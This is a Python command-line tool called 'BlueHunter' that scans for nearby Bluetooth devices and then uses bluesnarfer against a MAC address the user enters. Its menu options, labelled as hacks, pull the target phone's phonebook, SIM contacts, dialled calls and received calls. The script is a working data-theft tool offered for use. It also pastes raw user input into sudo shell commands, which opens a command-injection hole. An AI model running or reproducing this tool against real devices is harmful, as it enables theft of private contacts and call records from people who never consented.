import pyfiglet
from os import system, name
import os
import socket

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[92m'
    MAIN = '\033[95m'
    MAIN1 = '\033[96m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def clear():
  
    if name == 'nt':
        _ = system('cls')
  
    else:
        _ = system('clear')
hostname = socket.gethostname()
mainName = "                                      Created by Kaveesha Anuhas"
h1 = "hci0"
if mainName == '                                      Created by Kaveesha Anuhas':
    ascii_banner = pyfiglet.figlet_format("BlueHunter")
    print(bcolors.MAIN+ascii_banner)
    print(bcolors.WARNING+mainName)
    print(" ")
    os.system("sudo service bluetooth stop")
    os.system("sudo service bluetooth start")
    os.system("sudo hciconfig "+h1+" up")
    print(" ")
    print("1. Check Bluetooth Status")
    print("2. Scan Bluetooth Devices")
    print(" ")
    maina = input(hostname+"@BlueHunter:> ")
    if maina == "1. Check Bluetooth Status" or maina == "1." or maina == "1":
        clear()
        ascii_banner = pyfiglet.figlet_format("BlueHunter")
        print(bcolors.MAIN+ascii_banner)
        print(bcolors.WARNING+mainName)
        os.system("sudo hciconfig -a")
    elif maina == "2. Scan Bluetooth Devices" or maina == "2." or maina == "2":
        clear()
        ascii_banner = pyfiglet.figlet_format("BlueHunter")
        print(bcolors.MAIN+ascii_banner)
        print(bcolors.WARNING+mainName)
        os.system("sudo hcitool scan")
        print(" ")
        print("1. Connect Bluetooth Device")
        
        print(" ")
        scanmain = input(hostname+"@BlueHunter:> ")
        if scanmain == "1. Connect Bluetooth Device" or scanmain == "1." or scanmain == "1":
            clear()
            ascii_banner = pyfiglet.figlet_format("BlueHunter")
            print(bcolors.MAIN+ascii_banner)
            print(bcolors.WARNING+mainName)
            macId = input("Enter device mac id --> ")
            print(" ")
            os.system("sudo service bluetooth stop")
            os.system("sudo service bluetooth start")
            os.system("sudo bluesnarfer -b "+macId+" -C 2 -l")
            print(" ")
            print("1. Hack Bluetooth Device Unknow PhoneBook list")
            print("2. Hack Bluetooth Device SIM PhoneBook list")
            print("3. Hack Bluetooth Device Dialled PhoneBook list")
            print("4. Hack Bluetooth Device Received PhoneBook list")
            print(" ")
            adsw = input(hostname+"@BlueHunter:> ")
            if adsw == "1. Hack Bluetooth Device Unknow PhoneBook list" or adsw == "1." or adsw == "1":
                clear()
                ascii_banner = pyfiglet.figlet_format("BlueHunter")
                print(bcolors.MAIN+ascii_banner)
                print(bcolors.WARNING+mainName)
                os.system("sudo service bluetooth stop")
                os.system("sudo service bluetooth start")
                os.system("sudo bluesnarfer -b "+macId+" -C 2 -r 1-100 ME")
            elif adsw == "2. Hack Bluetooth Device SIM PhoneBook list" or adsw == "2." or adsw == "2":
                clear()
                ascii_banner = pyfiglet.figlet_format("BlueHunter")
                print(bcolors.MAIN+ascii_banner)
                print(bcolors.WARNING+mainName)
                os.system("sudo service bluetooth stop")
                os.system("sudo service bluetooth start")
                os.system("sudo bluesnarfer -b "+macId+" -C 2 -r 1-100 SM")
            elif adsw == "3. Hack Bluetooth Device Dialled PhoneBook list" or adsw == "3." or adsw == "3":
                clear()
                ascii_banner = pyfiglet.figlet_format("BlueHunter")
                print(bcolors.MAIN+ascii_banner)
                print(bcolors.WARNING+mainName)
                os.system("sudo service bluetooth stop")
                os.system("sudo service bluetooth start")
                os.system("sudo bluesnarfer -b "+macId+" -C 2 -r 1-100 DC")
            elif adsw == "4. Hack Bluetooth Device Received PhoneBook list" or adsw == "4." or adsw == "4":
                clear()
                ascii_banner = pyfiglet.figlet_format("BlueHunter")
                print(bcolors.MAIN+ascii_banner)
                print(bcolors.WARNING+mainName)
                os.system("sudo service bluetooth stop")
                os.system("sudo service bluetooth start")
                os.system("sudo bluesnarfer -b "+macId+" -C 2 -r 1-100 RC")
else:
    print("error")
        
